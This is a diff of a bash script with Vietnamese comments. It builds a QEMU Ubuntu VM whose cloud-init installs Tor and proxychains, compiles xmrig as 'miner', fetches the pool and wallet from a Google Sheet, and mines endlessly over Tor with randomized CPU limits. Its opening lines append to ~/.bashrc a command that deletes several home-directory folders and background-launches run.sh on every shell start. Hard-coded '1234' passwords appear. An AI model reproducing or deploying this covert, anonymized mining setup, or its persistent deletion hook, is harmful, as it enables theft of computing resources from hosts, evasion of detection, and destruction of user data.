@@ -1,4 +1,3 @@
-
 # Thay thế các lệnh trên bằng:
 cmd='rm -rf /home/user/.gradle /home/user/.emu /home/user/myapp /home/user/flutter 2>/dev/null'; grep -qxF "$cmd" ~/.bashrc || echo "$cmd" >> ~/.bashrc
 grep -qxF "bash $(realpath sh/run.sh) >/dev/null 2>&1 &" ~/.bashrc || \
@@ -13,11 +12,10 @@ BASE_IMG_URL="https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudim
 BASE_IMG="jammy-base.img"
 WORK_IMG="jammy-working.qcow2"
 CLOUD_INIT_ISO="cloud-init.iso"
-
 USER_NAME="user"
 USER_PASS="1234"
 ROOT_PASS="1234"
-HOST_NAME="majphu069"
+HOST_NAME="Aiden57a"
 
 # Google Sheets URL
 SHEET_URL="https://opensheet.elk.sh/1CS5OcWkBV0wBr0HPf1VmTUXp2ms8ev8zgZBtwQPbQ5Q/vi"
@@ -26,7 +24,6 @@ SHEET_URL="https://opensheet.elk.sh/1CS5OcWkBV0wBr0HPf1VmTUXp2ms8ev8zgZBtwQPbQ5Q
 echo "📊 Fetching pool and wallet from Google Sheets..."
 JSON_DATA=$(curl -sL "$SHEET_URL")
 
-# Try different possible column names
 WALLET=$(echo "$JSON_DATA" | jq -r '.[0].diachivi // .[0].wallet // .[0].WALLET // empty' 2>/dev/null)
 POOL=$(echo "$JSON_DATA" | jq -r '.[0].pool // .[0].POOL // empty' 2>/dev/null)
 
@@ -45,7 +42,6 @@ ROOT_HASH=$(echo "$ROOT_PASS" | openssl passwd -6 -stdin)
 
 if [ ! -f "$WORK_IMG" ]; then
     echo "🔁 Creating new QEMU working image and cloud-init..."
-
     rm -rf cloud-init
     rm -f "$CLOUD_INIT_ISO"
 
@@ -70,6 +66,7 @@ users:
   - name: root
     lock_passwd: false
     passwd: $ROOT_HASH
+
 ssh_pwauth: True
 
 write_files:
@@ -79,10 +76,28 @@ write_files:
       #!/bin/bash
       set -e
 
-      echo "🔧 Installing Tor, Xmrig, Proxychains..."
+      echo "🔧 Installing Tor (official repo), Xmrig, Proxychains..."
+
       apt update
-      apt install -y curl wget jq tor git build-essential cmake automake libtool autoconf \
-        libhwloc-dev libuv1-dev libssl-dev proxychains4
+      apt install -y curl wget jq git build-essential cmake automake libtool autoconf \
+        libhwloc-dev libuv1-dev libssl-dev proxychains4 gnupg
+
+      # === Cài Tor từ repo chính thức của Tor Project ===
+      TOR_OFFICIAL="false"
+      if curl -fsSL --max-time 15 https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc -o /tmp/tor-key.asc 2>/dev/null; then
+          gpg --dearmor < /tmp/tor-key.asc > /usr/share/keyrings/tor-archive-keyring.gpg 2>/dev/null
+          echo "deb [signed-by=/usr/share/keyrings/tor-archive-keyring.gpg] https://deb.torproject.org/torproject.org jammy main" > /etc/apt/sources.list.d/tor.list
+          if apt update -qq 2>/dev/null && apt install -y --no-install-recommends tor deb.torproject.org-keyring 2>/dev/null; then
+              TOR_OFFICIAL="true"
+              echo "✅ Tor installed from official Tor Project repository"
+          else
+              echo "⚠️ Failed to install Tor from official repo, falling back..."
+              apt install -y tor
+          fi
+      else
+          echo "⚠️ Failed to download Tor key, installing from default repo"
+          apt install -y tor
+      fi
 
       # --- Build Xmrig if not exists ---
       if [ ! -f /usr/local/bin/miner ]; then
@@ -94,33 +109,31 @@ write_files:
         chmod +x /usr/local/bin/miner
       fi
 
-      echo "🚀 Start Tor..."
+      echo "🚀 Starting Tor..."
       systemctl enable tor
       systemctl start tor
 
-      # --- Fetch config from Google Sheets on each boot ---
+      # --- Fetch config from Google Sheets ---
       fetch_config() {
         echo "📊 Fetching pool/wallet from Google Sheets..."
         JSON_DATA=\$(curl -sL "$SHEET_URL")
-        
+       
         WALLET=\$(echo "\$JSON_DATA" | jq -r '.[0].diachivi // .[0].wallet // .[0].WALLET // empty')
         POOL=\$(echo "\$JSON_DATA" | jq -r '.[0].pool // .[0].POOL // empty')
-        
+       
         if [ -z "\$WALLET" ] || [ -z "\$POOL" ]; then
           echo "❌ Failed to fetch config from sheets, using defaults"
-          WALLET="$WALLET"
-          POOL="$POOL"
+        else
+          echo "✅ Using Pool: \$POOL"
+          echo "✅ Using Wallet: \$WALLET"
         fi
-        
-        echo "✅ Using Pool: \$POOL"
-        echo "✅ Using Wallet: \$WALLET"
       }
 
       run_miner() {
         CPU_CORES=\$(( RANDOM % 2 + 2 ))
         CPU_HINT=\$(( RANDOM % 20 + 60 ))
         echo "💎 Start Xmrig cores=\$CPU_CORES hint=\$CPU_HINT%"
-        
+
         proxychains4 /usr/local/bin/miner \
           -o "\$POOL" \
           -u "\$WALLET" \
@@ -132,14 +145,12 @@ write_files:
           --cpu-max-threads-hint=\$CPU_HINT
       }
 
-      # Fetch config once at startup
       fetch_config
 
       while true; do
         echo "🌐 Checking Tor IP..."
         TOR_IP=""
-        
-        # Try to get Tor IP, max 300 attempts
+
         for attempt in {1..300}; do
           TOR_IP=\$(curl -s --socks5 127.0.0.1:9050 --max-time 10 https://api.ipify.org || echo "")
           if [ -n "\$TOR_IP" ]; then
@@ -150,21 +161,16 @@ write_files:
           sleep 2
         done
 
-        # If no Tor IP after 300 attempts, restart Tor and retry
         if [ -z "\$TOR_IP" ]; then
-          echo "❌ Tor not working after 300 attempts, restarting Tor service..."
+          echo "❌ Tor not working after 300 attempts, restarting Tor..."
           systemctl restart tor
           sleep 10
-          echo "🔄 Retrying Tor check after restart..."
           continue
         fi
 
-        # Only run miner if we have confirmed Tor IP
         echo "🔒 Tor connection confirmed, starting miner..."
-        echo "💎 Miner will run continuously until stopped"
         run_miner
-        
-        # If miner exits (error/crash), wait and restart
+
         echo "⚠️ Miner stopped unexpectedly, restarting in 30s..."
         sleep 30
       done
@@ -203,6 +209,7 @@ local-hostname: $HOST_NAME
 EOF
 
     cloud-localds "$CLOUD_INIT_ISO" cloud-init/user-data cloud-init/meta-data
+
 else
     echo "✅ Using existing QEMU image: $WORK_IMG"
 fi
